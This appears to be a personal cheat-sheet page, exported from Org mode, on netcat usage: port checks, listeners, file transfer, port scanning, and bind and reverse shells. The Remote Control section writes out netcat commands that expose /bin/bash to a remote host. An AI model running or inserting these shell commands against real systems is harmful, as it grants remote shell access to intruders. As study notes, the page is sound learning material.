@@ -1,0 +1,199 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<!-- 2020-07-12 Sun 19:30 -->
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>netcat</title>
+<meta name="generator" content="Org mode" />
+<meta name="author" content="Annie Mao" />
+<link rel="stylesheet" type="text/css" href="css/stylesheet.css" />
+<link href="https://fonts.googleapis.com/css?family=Ubuntu+Mono&amp;display=swap" rel="stylesheet">
+<script type="text/javascript">
+// @license magnet:?xt=urn:btih:1f739d935676111cfff4b4693e3816e664797050&amp;dn=gpl-3.0.txt GPL-v3-or-Later
+<!--/*--><![CDATA[/*><!--*/
+     function CodeHighlightOn(elem, id)
+     {
+       var target = document.getElementById(id);
+       if(null != target) {
+         elem.cacheClassElem = elem.className;
+         elem.cacheClassTarget = target.className;
+         target.className = "code-highlighted";
+         elem.className   = "code-highlighted";
+       }
+     }
+     function CodeHighlightOff(elem, id)
+     {
+       var target = document.getElementById(id);
+       if(elem.cacheClassElem)
+         elem.className = elem.cacheClassElem;
+       if(elem.cacheClassTarget)
+         target.className = elem.cacheClassTarget;
+     }
+    /*]]>*///-->
+// @license-end
+</script>
+</head>
+<body>
+<div id="org-div-home-and-up">
+ <a accesskey="h" href="index.html"> UP </a>
+ |
+ <a accesskey="H" href="index.html"> HOME </a>
+</div><div id="content">
+<h1 class="title">netcat</h1>
+<dl class="org-dl">
+<dt>tags</dt><dd></dd>
+</dl>
+
+<p>
+Netcat can be used to connect to a TCP/UDP port.
+</p>
+
+<div id="outline-container-orgc1707b7" class="outline-2">
+<h2 id="orgc1707b7">Client Mode</h2>
+<div class="outline-text-2" id="text-orgc1707b7">
+</div>
+<div id="outline-container-orgc3a0887" class="outline-3">
+<h3 id="orgc3a0887">Check if a port is open</h3>
+</div>
+<div id="outline-container-org3b74b5b" class="outline-3">
+<h3 id="org3b74b5b">Read a banner from the service listening on the port</h3>
+</div>
+<div id="outline-container-org5638e7a" class="outline-3">
+<h3 id="org5638e7a">Connect to a network service manually</h3>
+</div>
+<div id="outline-container-org30f4a4c" class="outline-3">
+<h3 id="org30f4a4c">Useful configs for netcat</h3>
+<div class="outline-text-3" id="text-org30f4a4c">
+<pre class="example">
+-n: skip DNS name resolution
+-v verbose
+
+nc -nv &lt;ip_add&gt; &lt;port_num&gt;
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-org2c5d7fe" class="outline-2">
+<h2 id="org2c5d7fe">Server Mode</h2>
+<div class="outline-text-2" id="text-org2c5d7fe">
+</div>
+<div id="outline-container-org73d66ce" class="outline-3">
+<h3 id="org73d66ce">Listen for incoming connections on a specific port.</h3>
+<div class="outline-text-3" id="text-org73d66ce">
+<pre class="example">
+-n skip DNS name resolution
+-l listen
+-v verbose
+-p port number
+
+nc -nlvp &lt;port_num&gt;
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-orgb6476ff" class="outline-2">
+<h2 id="orgb6476ff">File Transfer</h2>
+<div class="outline-text-2" id="text-orgb6476ff">
+</div>
+<div id="outline-container-orgc2f0abb" class="outline-3">
+<h3 id="orgc2f0abb">Set up a server to save incoming connection output to a file</h3>
+<div class="outline-text-3" id="text-orgc2f0abb">
+<div class="org-src-container">
+<pre class="src src-shell">nc -nlvp &lt;server_port_num&gt; &gt; &lt;incoming_file&gt;
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-org1ec55b0" class="outline-3">
+<h3 id="org1ec55b0">Set up a client to upload file to that server</h3>
+<div class="outline-text-3" id="text-org1ec55b0">
+<div class="org-src-container">
+<pre class="src src-shell">nc -nv &lt;server_ip&gt; &lt;server_port_num&gt; &lt; &lt;file_to_tranfer&gt;
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-org78135d6" class="outline-2">
+<h2 id="org78135d6">Remote Control</h2>
+<div class="outline-text-2" id="text-org78135d6">
+<p>
+Netcat versions with -e support can do command redirection. It can send all the STDIN, STDOUT, STDERR of the executable to a TCP/UDP port. If the command is a shell, like /bin/bash, then whoever connected to the port get the shell access to that machine.
+</p>
+</div>
+<div id="outline-container-orgd2d91f2" class="outline-3">
+<h3 id="orgd2d91f2">Bind Shell</h3>
+<div class="outline-text-3" id="text-orgd2d91f2">
+<p>
+A server can expose its shell by doing this:
+</p>
+<div class="org-src-container">
+<pre class="src src-shell">nc -nlvp &lt;server_port_num&gt; -e /bin/bash
+</pre>
+</div>
+
+<p>
+A client can gain access to the server shell via nc:
+</p>
+<div class="org-src-container">
+<pre class="src src-shell">nc -nv &lt;server_ip&gt; &lt;server_port_num&gt;
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-org6f94f87" class="outline-3">
+<h3 id="org6f94f87">Reverse Shell</h3>
+<div class="outline-text-3" id="text-org6f94f87">
+<p>
+The party whom wants to get to access to some other machine can first set up a listener:
+</p>
+<div class="org-src-container">
+<pre class="src src-shell">nc -nlvp &lt;server_port_num&gt;
+</pre>
+</div>
+<p>
+The party who want to give remote access to someone, and send the shell command redirection over.
+</p>
+<div class="org-src-container">
+<pre class="src src-shell">nc -nv &lt;server_ip&gt; &lt;server_port_num&gt; -e /bin/bash
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-orgfb189b7" class="outline-2">
+<h2 id="orgfb189b7">Port Scaning</h2>
+<div class="outline-text-2" id="text-orgfb189b7">
+</div>
+<div id="outline-container-orgee12063" class="outline-3">
+<h3 id="orgee12063">TCP connect scan</h3>
+<div class="outline-text-3" id="text-orgee12063">
+<p>
+-w: timeout in sec, -z: zero IO
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">nc -nvv -w <span style="color: #da8548; font-weight: bold;">1</span> -z &lt;ip_addr&gt; &lt;port_range&gt;
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-org80c0219" class="outline-3">
+<h3 id="org80c0219">UDP scan</h3>
+<div class="outline-text-3" id="text-org80c0219">
+<div class="org-src-container">
+<pre class="src src-sh">
+</pre>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<p class="author">Author: Annie Mao</p>
+<p class="date">Created: 2020-07-12 Sun 19:30</p>
+</div>
+</body>
+</html>
